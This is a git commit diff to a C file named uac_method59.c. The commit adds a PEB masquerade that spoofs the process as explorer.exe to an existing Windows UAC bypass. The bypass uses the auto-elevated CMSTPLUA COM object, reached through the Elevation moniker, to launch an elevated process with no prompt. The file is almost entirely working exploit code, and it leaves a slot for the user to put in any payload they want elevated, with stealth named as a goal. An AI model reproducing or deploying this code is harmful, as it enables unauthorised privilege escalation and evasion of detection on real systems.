78f079cde06692c63c00182f0117ebf596200bb0
troytmoneytrs <joe@troysmithson.com>
2026-04-07 10:08:49 -0500

    Implement PEB masquerade for UAC bypass
    Added PEB masquerade function for stealth elevation.

--- uac_method59.c
+++ uac_method59.c
@@ -1,8 +1,9 @@
 #include <windows.h>
 #include <objbase.h>
 #include <stdio.h>
+#include <winternl.h>  // For PEB access
 
-// ICMLuaUtil interface
+// ICMLuaUtil interface (same as before)
 typedef interface ICMLuaUtil ICMLuaUtil;
 
 typedef struct ICMLuaUtilVtbl {
@@ -12,7 +13,6 @@ typedef struct ICMLuaUtilVtbl {
     ULONG(STDMETHODCALLTYPE *Release)(ICMLuaUtil *This);
     HRESULT(STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil *This, LPCWSTR lpFile, LPCWSTR lpParameters,
                                           LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
-    // Add more methods if needed in future
     END_INTERFACE
 } ICMLuaUtilVtbl;
 
@@ -20,37 +20,55 @@ typedef struct ICMLuaUtil {
     CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
 } ICMLuaUtil;
 
-// GUIDs
 static const CLSID CLSID_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7}};
 static const IID   IID_ICMLuaUtil = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C}};
+
+// Simple PEB masquerade - spoof as explorer.exe
+void MasqueradePEB() {
+    PPEB pPeb = (PPEB)__readgsqword(0x60);  // x64 PEB
+    if (pPeb && pPeb->ProcessParameters) {
+        // Spoof image path and command line to look like explorer.exe
+        wchar_t explorerPath[] = L"C:\\Windows\\explorer.exe";
+        pPeb->ProcessParameters->ImagePathName.Buffer = explorerPath;
+        pPeb->ProcessParameters->ImagePathName.Length = (USHORT)(wcslen(explorerPath) * 2);
+        pPeb->ProcessParameters->ImagePathName.MaximumLength = pPeb->ProcessParameters->ImagePathName.Length + 2;
+
+        pPeb->ProcessParameters->CommandLine.Buffer = explorerPath;
+        pPeb->ProcessParameters->CommandLine.Length = pPeb->ProcessParameters->ImagePathName.Length;
+        pPeb->ProcessParameters->CommandLine.MaximumLength = pPeb->ProcessParameters->CommandLine.Length + 2;
+    }
+}
 
 int main(void) {
     HRESULT hr;
     ICMLuaUtil *pLuaUtil = NULL;
     BIND_OPTS3 bo = {0};
 
+    // First, masquerade as explorer.exe for stealth and better auto-elevation chance
+    MasqueradePEB();
+
     CoInitialize(NULL);
 
     bo.cbStruct = sizeof(bo);
     bo.dwClassContext = CLSCTX_LOCAL_SERVER;
 
-    // Auto-elevated COM object via Elevation moniker (no UAC prompt)
+    // Elevation moniker
     hr = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
                      (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (void**)&pLuaUtil);
 
     if (SUCCEEDED(hr) && pLuaUtil != NULL) {
-        // <<< CHANGE THIS TO YOUR DESIRED PAYLOAD >>>
+        // <<< CHANGE THIS PAYLOAD TO WHATEVER YOU WANT ELEVATED >>>
         pLuaUtil->lpVtbl->ShellExec(pLuaUtil,
                                     L"C:\\Windows\\System32\\cmd.exe",
-                                    L"/k whoami && echo Elevated via CMSTPLUA && pause",
+                                    L"/k whoami && echo SUCCESS - Elevated via CMSTPLUA with PEB spoof && pause",
                                     NULL,
                                     SEE_MASK_DEFAULT,
                                     SW_SHOW);
 
         pLuaUtil->lpVtbl->Release(pLuaUtil);
-        printf("[+] CMSTPLUA UAC bypass successful - elevated process launched.\n");
+        printf("[+] CMSTPLUA bypass with PEB masquerade successful.\n");
     } else {
-        printf("[-] Failed to get elevated COM object. HRESULT: 0x%08X\n", hr);
+        printf("[-] Failed. HRESULT: 0x%08X\n", hr);
     }
 
     CoUninitialize();
